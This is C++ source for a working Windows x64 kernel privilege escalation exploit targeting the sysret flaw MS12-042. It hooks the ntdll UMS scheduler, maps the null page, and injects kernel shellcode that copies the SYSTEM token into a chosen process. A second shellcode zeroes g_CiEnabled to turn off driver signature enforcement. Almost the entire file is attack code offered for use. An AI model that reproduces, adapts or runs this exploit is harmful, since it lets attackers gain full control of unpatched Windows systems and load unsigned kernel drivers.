// junk.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "sysret.h"
#include "log.h"
#include "peutil.h"
#include "MinHook\MinHook.h"
#pragma comment(lib, "MinHook\\MinHook.x64.lib")

extern "C"
{
	PVOID OrginalUmsSchedulerAddress;
}

PUMS_COMPLETION_LIST UMSCompletionList;
PUMS_CONTEXT   pUmsThread;

VOID 
WINAPI 
UmsSchedulerProc(
	UMS_SCHEDULER_REASON Reason, 
	ULONG_PTR ActivationPayload, 
	PVOID SchedulerParam
	)
{

	PUMS_CONTEXT next;
	ULONG retlen;
	BOOLEAN bTerminated;
	BOOL bOk;

	switch (Reason)
	{
	case UmsSchedulerStartup:
		break;

	case UmsSchedulerThreadYield:
		goto switch_to_task;

	case UmsSchedulerThreadBlocked:
		break;
	}

	for (;;)
	{
		PUMS_CONTEXT UmsThreadList;
		if (DequeueUmsCompletionListItems(UMSCompletionList, INFINITE, &UmsThreadList))
		{
			if (UmsThreadList)
			{
				next = GetNextUmsListItem(UmsThreadList);
				bOk = QueryUmsThreadInformation(pUmsThread, UmsThreadIsTerminated, &bTerminated, sizeof(bTerminated), &retlen);

				goto switch_to_task;
			}
		}
	}

switch_to_task:
	for (;;)
	{
		ExecuteUmsThread(pUmsThread);
	}
}


DWORD
WINAPI
UmsTaskProc(
	LPVOID lpThreadParameter
	)
{
	//DEBUG_PRINTF(L_INFO, "UMS Task has successfully started!");  
	UmsThreadYield(0);
	//DEBUG_PRINTF(L_INFO, "UMS Task has successfully executed!");
	return 0;
}

int main(int argc, CHAR** argv)
{
	ULONG_PTR ProcessId;
	SIZE_T attrsize;
	LPPROC_THREAD_ATTRIBUTE_LIST attrlist;
	UMS_CREATE_THREAD_ATTRIBUTES umsattribs;
	UMS_SCHEDULER_STARTUP_INFO umsinfo;
	HANDLE hThread;
	ERRORINFO err;

	
	
	if ( argc < 3 ) 
	{
		printf("Usage : sysret.exe <option> <argument>\n");
		printf("option :\n"); 
		printf("-pid <pid>\n-exec <executable>\n");
		return FALSE;
	}

	DEBUG_PRINTF(L_INFO,"Windows Kernel Intel x64 Sysret Vulnerability (MS12-042)");
	DEBUG_PRINTF(L_INFO,"Exploited by Shahriyar Jalayeri (Shahriyar.j [at] gmail) -- just for fun");

	if ( stricmp(argv[1], "-pid") == 0 )
	{
		DEBUG_PRINTF(L_INFO,"Escalating PID : %p", atoi(argv[2]));
		ProcessId = atoi(argv[2]);
	}
	else if ( strcmp(argv[1], "-exec") == 0 )
	{
		DEBUG_PRINTF(L_INFO, "Spawning child process...");
		if ( ( ProcessId = SpawnProcess(argv[1]) ) == 0 )
			return FALSE;
	}

	DEBUG_PRINTF(L_INFO, "Hooking RtlpUmsPrimaryContextWrap...");
	if ( HookUmsScheduler() == FALSE )
		return FALSE;

	DEBUG_PRINTF(L_INFO, "Allocating null page...");
	if ( AlocNullPageAndFixCondtions() == TRUE )
	{
		DEBUG_PRINTF(L_INFO,"Page allocated at : %p", 0L);
		DEBUG_PRINTF(L_INFO,"Control flow changed to shellcode execution path.");
	}
	else
	{
		DEBUG_PRINTF(L_ERROR,"Null page allocation failed!");
		return FALSE;
	}

	if ( SetupKernelShellcode(0x4444444444444444, ProcessId) == TRUE )
	{
		DEBUG_PRINTF(L_INFO,"Shellcode fixed and palaced at allocated memory.");
		Sleep(3*1000);
	}
	else
	{
		DEBUG_PRINTF(L_ERROR,"Setuping Shellcode failed!");
		return FALSE;
	}

	if ( CreateUmsCompletionList(&UMSCompletionList) == FALSE )
	{
		REPORT_ERROR("CreateUmsCompletionList", &err);
		return FALSE;
	}

	attrsize = 0;
	InitializeProcThreadAttributeList(NULL, 1, 0, &attrsize);
	attrlist = (LPPROC_THREAD_ATTRIBUTE_LIST) LocalAlloc(LMEM_ZEROINIT, attrsize);
	if ( InitializeProcThreadAttributeList(attrlist, 1, 0, &attrsize) != TRUE )
	{
		REPORT_ERROR("InitializeProcThreadAttributeList", &err);
		return FALSE;
	}

	if ( CreateUmsThreadContext(&pUmsThread) == FALSE )
	{
		REPORT_ERROR("CreateUmsThreadContext", &err);
		return FALSE;
	}


	umsattribs.UmsVersion = UMS_VERSION;
	umsattribs.UmsContext = pUmsThread;
	umsattribs.UmsCompletionList = UMSCompletionList;
	if ( UpdateProcThreadAttribute(attrlist, 0, PROC_THREAD_ATTRIBUTE_UMS_THREAD, &umsattribs, sizeof(umsattribs), NULL, NULL) != TRUE )
	{
		REPORT_ERROR("UpdateProcThreadAttribute", &err);
		return FALSE;
	}

	hThread = CreateRemoteThreadEx(GetCurrentProcess(), NULL, 0, &UmsTaskProc, 0, 0, attrlist, NULL);
	if ( hThread != INVALID_HANDLE_VALUE )
	{
		DeleteProcThreadAttributeList(attrlist);
		CloseHandle(hThread);
		LocalFree(attrlist);
	}
	else
	{
		REPORT_ERROR("CreateRemoteThreadEx", &err);
		return FALSE;
	}

	umsinfo.UmsVersion = UMS_VERSION;
	umsinfo.CompletionList = UMSCompletionList;
	umsinfo.SchedulerProc = UmsSchedulerProc;
	umsinfo.SchedulerParam = NULL;
	DEBUG_PRINTF(L_INFO, "Entering User-mode Scheduling Mode!");
	if ( EnterUmsSchedulingMode(&umsinfo) == TRUE )
	{
		DeleteUmsThreadContext(pUmsThread);
		return TRUE;
	}

	REPORT_ERROR("EnterUmsSchedulingMode", &err);
	return FALSE;
}

BOOL
AlocNullPageAndFixCondtions(
	VOID
	)
{
	NTSTATUS Status;
	SIZE_T RegionSize;
	PVOID lpBaseAddress;
	NtAllocateVirtualMemory_ NtAllocateVirtualMemory;
	ERRORINFO err;

	NtAllocateVirtualMemory = (NtAllocateVirtualMemory_)(GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtAllocateVirtualMemory"));
	if ( NtAllocateVirtualMemory != NULL )
	{
		RegionSize = 0xF000;
		lpBaseAddress= (PVOID)0x1;
		Status = NtAllocateVirtualMemory( GetCurrentProcess(), 
			                              &lpBaseAddress, 
										  0L, 
										  &RegionSize, 
										  MEM_COMMIT | MEM_RESERVE, 
										  PAGE_EXECUTE_READWRITE);
		if ( NT_SUCCESS(Status) )
		{
			RtlFillMemory(lpBaseAddress, RegionSize, 0x00);
			/*
			ntoskrnl.exe:FFFFF800028C94DF mov     rax, gs:qword_188
			ntoskrnl.exe:FFFFF800028C94E8 bt      dword ptr [rax+4Ch], 0Bh
			ntoskrnl.exe:FFFFF800028C94ED jnb     short loc_FFFFF800028C94FD
			*/
			*(PLONGLONG)((ULONG_PTR)lpBaseAddress+0x4C)  = 0x1800;

			/*
			ntoskrnl.exe:FFFFF800029EBBD3 mov     esi, 1
			ntoskrnl.exe:FFFFF800029EBBD8 add     [rbx+1C4h], si
			*/
			//*(PLONGLONG)((ULONG_PTR)lpBaseAddress+0x1C4) = 0xFFFFFFFFFFFFFFFF;

			/*
			ntoskrnl.exe:FFFFF800028C9CA0 mov     rcx, gs:qword_188
			ntoskrnl.exe:FFFFF800028C9CA9 mov     rcx, [rcx+28h]
			ntoskrnl.exe:FFFFF800028C9CAD lea     rcx, [rcx+50h]
			ntoskrnl.exe:FFFFF800028C9CB1 mov     [rsp+40h], rcx
			ntoskrnl.exe:FFFFF800028C9CB6 fxsave  dword ptr [rcx]
			*/
			*(PLONGLONG)((ULONG_PTR)lpBaseAddress+0x28) =  0x0100;

			/*
			ntoskrnl.exe:FFFFF800029E86A8 mov     rbx, gs:qword_188
			ntoskrnl.exe:FFFFF800029E86B1 mov     r12, rcx
			ntoskrnl.exe:FFFFF800029E86B4 mov     [rcx+60h], rbx
			ntoskrnl.exe:FFFFF800029E86B8 mov     rax, [rbx+1B8h]
			ntoskrnl.exe:FFFFF800029E86BF mov     rbp, [rax+80h]
			ntoskrnl.exe:FFFFF800029E86C6 mov     rcx, rbp
			ntoskrnl.exe:FFFFF800029E86C9 call    near ptr PspFindThreadForTeb
			*/
			*(PLONGLONG)((ULONG_PTR)lpBaseAddress+0x80) =  0x01;
			*(PLONGLONG)((ULONG_PTR)lpBaseAddress+0x70) =  0x1700;
			return TRUE;
		}

		REPORT_ERROR("GetProcAddress", &err);
		return FALSE;
	}

	REPORT_ERROR("NtAllocateVirtualMemory", &err);
	return FALSE;
}

BOOL
SetupKernelShellcode(
	IN ULONG_PTR UsermodeReturnAddress,
	ULONG_PTR ProcessId
	)
{
	/*
	http://mcdermottcybersecurity.com/articles/x64-kernel-privilege-escalation
	;grant SYSTEM account privileges to calling process
	;slightly modified to handle custom pid, gs changes and sysret 
	[BITS 64]

	start:
		swapgs							; swap gs to kernelmode
		mov rcx, 0x4141414141414141		; process id
		lea rdx, [rsp+8h]				; EPROCESS *
		mov rax, 0x4242424242424242		; PsLookupProcessByProcessId address
		call rax						; call PsLookupProcessByProcessId
		mov r8, [rsp+8h]				; PID EPROCESS address
		mov r9, [r8+188h]				;ActiveProcessLinks list head
		mov rcx, [r9]					;follow link to first process in list
	find_system_proc:
		mov rdx, [rcx-8]				;offset from ActiveProcessLinks to UniqueProcessId
		cmp rdx, 4						;process with ID 4 is System process
		jz found_it
		mov rcx, [rcx]					;follow _LIST_ENTRY Flink pointer
		cmp rcx, r9						;see if back at list head
		jnz find_system_proc
		db 0cch							;(int 3) process #4 not found, should never happen
 
	found_it:
		mov rax, [rcx+80h]				;offset from ActiveProcessLinks to Token
		and al, 0f0h					;clear low 4 bits of _EX_FAST_REF structure
		mov [r8+208h], rax				;replace current process token with system token
		swapgs							; swap gs to usermode
		mov rcx, 0x4343434343434343		; set return address to rcx
		sysret							; return to usermode
		*/
	BYTE KernelShellcode[] = {
		0x0F, 0x01, 0xF8, 0x48, 0xB9, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
		0x41, 0x48, 0x8D, 0x54, 0x24, 0x08, 0x48, 0xB8, 0x42, 0x42, 0x42, 0x42,
		0x42, 0x42, 0x42, 0x42, 0xFF, 0xD0, 0x4C, 0x8B, 0x44, 0x24, 0x08, 0x4D,
		0x8B, 0x88, 0x88, 0x01, 0x00, 0x00, 0x49, 0x8B, 0x09, 0x48, 0x8B, 0x51,
		0xF8, 0x48, 0x83, 0xFA, 0x04, 0x74, 0x09, 0x48, 0x8B, 0x09, 0x4C, 0x39,
		0xC9, 0x75, 0xEE, 0xCC, 0x48, 0x8B, 0x81, 0x80, 0x00, 0x00, 0x00, 0x24,
		0xF0, 0x49, 0x89, 0x80, 0x08, 0x02, 0x00, 0x00, 0x0F, 0x01, 0xF8, 0x48,
		0xB9, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x0F, 0x07
	};


	/*
		mov rax, 04141414141414141h		; get g_CiEnabled address
		mov qword ptr [rax], 0			; disable it
		xor rax, rax
	*/
	BYTE DisableCodeSigning[] = { 
		0x48, 0xB8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
		0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xC0										
		};

	CHAR		szKernelImageName[MAX_PATH];
	BYTE		FixAddress[8];
	HMODULE		hNtOsHandle;
	ULONG_PTR	PsLookupProcessByProcessId;
	ULONG_PTR	KernelBaseAddress;
	ULONG_PTR	g_CiEnabled;
	ULONG_PTR	KernelShellcodeAddress;
	ERRORINFO	err;

	// get kernel base address, we need it calculate 
	// functions and variables address inside the loaded kernel.
	if ( !GetKernelBaseInfo( &KernelBaseAddress, szKernelImageName, MAX_PATH) )
	{
		DEBUG_PRINTF(L_ERROR,"Faild to get kernel base address.");
		return FALSE;
	}

	// load kernel from user-mode
	hNtOsHandle = LoadLibrary( szKernelImageName );
	if ( hNtOsHandle == NULL )
	{
		REPORT_ERROR("LoadLibrary()", &err);
		return FALSE;
	}

	if ( ( PsLookupProcessByProcessId = KernelGetProcAddress( (ULONG_PTR)hNtOsHandle, KernelBaseAddress, "PsLookupProcessByProcessId" ) ) == NULL )
		return FALSE;
	DEBUG_PRINTF(L_INFO, "PsLookupProcessByProcessId at : %p", PsLookupProcessByProcessId );

	// g_CiEnabled is the key viarble used for Disable/Enable
	// Windows x64 Code Signing Policy. it is used inside SeValidateImageHeader,
	// if we set this vaiable to 0, kernel doesnt check driver is signed or not.
	if ( ( g_CiEnabled = GetCiEnabledAddress(hNtOsHandle) ) == NULL )
	{
		DEBUG_PRINTF(L_INFO, "Faild to get g_CiEnabled address.");
		return FALSE;
	}

	// make its address absolute 
	g_CiEnabled = g_CiEnabled - (ULONG_PTR)hNtOsHandle + (ULONG_PTR)KernelBaseAddress;
	DEBUG_PRINTF(L_INFO, "g_CiEnabled Pointer at : %p", g_CiEnabled );

	// fix the shellcode with g_CiEnabled address
	for ( DWORD i = 0; i <=7; i++ ) FixAddress[i] = (byte)( ( g_CiEnabled >> ( i * 8 ) ) & 0x00000000000000FF );
	RtlCopyMemory( DisableCodeSigning+2, FixAddress, sizeof(FixAddress) );

	// fix the shellcode with PID
	for ( DWORD i = 0; i <=7; i++ ) FixAddress[i] = (byte)( ( ProcessId >> ( i * 8 ) ) & 0x00000000000000FF );
	RtlCopyMemory( KernelShellcode+5, FixAddress, sizeof(FixAddress) );

	// fix the shellcode with PsLookupProcessByProcessId address
	for ( DWORD i = 0; i <=7; i++ ) FixAddress[i] = (byte)( ( PsLookupProcessByProcessId >> ( i * 8 ) ) & 0x00000000000000FF );
	RtlCopyMemory( KernelShellcode+20, FixAddress, sizeof(FixAddress) );

	// fix the shellcode with UsermodeReturnAddress address
	for ( DWORD i = 0; i <=7; i++ ) FixAddress[i] = (byte)( ( UsermodeReturnAddress >> ( i * 8 ) ) & 0x00000000000000FF );
	RtlCopyMemory( KernelShellcode+85, FixAddress, sizeof(FixAddress) );


	KernelShellcodeAddress = (ULONG_PTR)VirtualAlloc( NULL,
		                                              1024,
										              MEM_COMMIT,
										              PAGE_EXECUTE_READWRITE);
	if ( KernelShellcodeAddress == NULL )
	{
		REPORT_ERROR("VirtualAlloc()", &err);
		return FALSE;
	}

	DEBUG_PRINTF(L_INFO,"Shellcode memory allocated at : %p", KernelShellcodeAddress);
	// copy kernel shellcode 
	RtlCopyMemory( (LPVOID)KernelShellcodeAddress, DisableCodeSigning, sizeof(DisableCodeSigning));
	RtlCopyMemory( (LPVOID)(KernelShellcodeAddress+sizeof(DisableCodeSigning)), KernelShellcode, sizeof(KernelShellcode));
	*(PLONGLONG)((ULONG_PTR)0L+0x10) =  KernelShellcodeAddress;
	return TRUE;
}

ULONG_PTR 
SpawnProcess(
	IN PCHAR szProcess
	)
{
	STARTUPINFO si;
    PROCESS_INFORMATION pi;
	ERRORINFO err;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    if( !CreateProcess( NULL,		
						szProcess,  
						NULL,       
						NULL,       
						FALSE,      
						0,          
						NULL,       
						NULL,       
						&si,        
						&pi )
    ) 
    {
		REPORT_ERROR("CreateProcess()", &err);
        return 0;
    }

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );

	return pi.dwProcessId;
}

ULONG_PTR
GetUmsSchedulerAddress(
	VOID
	)
{
	BYTE UmsSchedulerSig[] = { 0x49, 0x89, 0x8a };
	DWORD i;
	ULONG_PTR NtdllCodeSection     = (ULONG_PTR)PeGetCodeSectionAddress(GetModuleHandle("NTDLL"));
	ULONG_PTR NtdllCodeSectionSize = (ULONG_PTR)PeGetCodeSectionSize(GetModuleHandle("NTDLL"));
	
	if ( NtdllCodeSection != NULL && NtdllCodeSectionSize != NULL )
	{
		for( i = 0; i < NtdllCodeSectionSize; i++ )
			if ( !memcmp( (LPVOID)(NtdllCodeSection+i), UmsSchedulerSig, sizeof(UmsSchedulerSig)) )
				return (NtdllCodeSection+i);
	}

	return NULL;
}



BOOL
HookUmsScheduler(
	VOID
	)
{	
	LPVOID UmsSchedulerAddress = (LPVOID)GetUmsSchedulerAddress();
	if ( UmsSchedulerAddress == NULL )
		return FALSE;

	DEBUG_PRINTF(L_INFO, "RtlpUmsPrimaryContextWrap hook point at : %p", UmsSchedulerAddress );
	if ( MH_Initialize() != MH_OK )
    {
        return FALSE;
    }

    if ( MH_CreateHook(UmsSchedulerAddress, SetNonCanonicalAddress , &OrginalUmsSchedulerAddress) != MH_OK)
    {
        return FALSE;
    }

    if (MH_EnableHook(UmsSchedulerAddress) != MH_OK)
    {
        return FALSE;
    }

	return TRUE;
}